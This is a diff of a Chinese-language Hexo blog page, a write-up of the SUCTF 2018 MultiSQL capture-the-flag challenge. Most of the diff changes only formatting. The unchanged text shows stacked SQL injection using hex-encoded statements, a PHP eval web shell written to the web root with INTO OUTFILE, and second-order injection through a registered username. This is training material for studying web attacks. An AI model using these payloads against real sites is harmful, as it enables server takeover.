@@ -7,13 +7,12 @@
     <meta name="keywords" content="刷题笔记:[SUCTF 2018]MultiSQL, 远离尘世的幻想乡">
     <meta name="description" content="前言关键字:[sql读文件|outfile|load_file]
 
-题解注册个账号，发现?id=2
+题解注册个账号，发现?id&amp;#x3D;2
 试了下异或，可行
 
 尝试了很久，过滤了很多东西，substr被过滤了，不过mid还可以。
 
-数据库用户suctf@localhost
-堆叠注">
+数据库用户suctf@localhos">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -49,7 +48,7 @@
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -524,12 +523,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/SQL%E6%B3%A8%E5%85%A5/">
@@ -571,7 +570,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    609
+                    622
                 </div>
                 
 
@@ -597,12 +596,12 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[sql读文件|outfile|load_file]</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821131531758.png"></p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>注册个账号，发现?id=2</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821131531758.png"></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>注册个账号，发现?id&#x3D;2</p>
 <p>试了下异或，可行</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821132717828.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821132717828.png"></p>
 <p>尝试了很久，过滤了很多东西，substr被过滤了，不过mid还可以。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821133645237.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821133645237.png"></p>
 <p>数据库用户suctf@localhost</p>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>测试了下select 123，没反应，还以为不能堆叠注入。</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select 123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//73656C65637420313233</span>
@@ -614,14 +613,14 @@
 <ul>
 <li><p>secure_file_priv</p>
 <blockquote>
-<p>null =&gt; 不允许导入/导出</p>
-<p>/tmp/ =&gt; 导入/导出只能发生在/tmp/目录下</p>
-<p>没有具体值 =&gt; 不做限制</p>
+<p>null &#x3D;&gt; 不允许导入&#x2F;导出</p>
+<p>&#x2F;tmp&#x2F; &#x3D;&gt; 导入&#x2F;导出只能发生在&#x2F;tmp&#x2F;目录下</p>
+<p>没有具体值 &#x3D;&gt; 不做限制</p>
 </blockquote>
 </li>
 </ul>
-<p>先查下这个函数为/var/www/，所以是可以直接写入shell的。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821155311899.png"></p>
+<p>先查下这个函数为&#x2F;var&#x2F;www&#x2F;，所以是可以直接写入shell的。</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821155311899.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select '&lt;?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -667,7 +666,7 @@ url <span class="token operator">=</span> <span class="token string">'http://733
 
 <p>题目名是MultiSQL，试试二次注入</p>
 <p>注册用户名为<code>1&#39;and 0</code></p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821135214740.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821135214740.png"></p>
 <p>写个代码，方便看回显</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
@@ -684,9 +683,9 @@ name <span class="token operator">=</span> html<span class="token punctuation">.
 <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>单引号双引号会加反斜杠，过滤的字符会变成@@</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821141202344.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821141202344.png"></p>
 <p>还是老规矩，fuzz一下吧</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821144946867.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821144946867.png"></p>
 <p>不过这意义也不大，毕竟flag不在数据库里。就这样吧。</p>
 
                 
@@ -752,12 +751,12 @@ name <span class="token operator">=</span> html<span class="token punctuation">.
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/SQL%E6%B3%A8%E5%85%A5/">
@@ -1111,12 +1110,12 @@ name <span class="token operator">=</span> html<span class="token punctuation">.
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/Flask/">
@@ -1168,12 +1167,12 @@ name <span class="token operator">=</span> html<span class="token punctuation">.
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/XXE/">
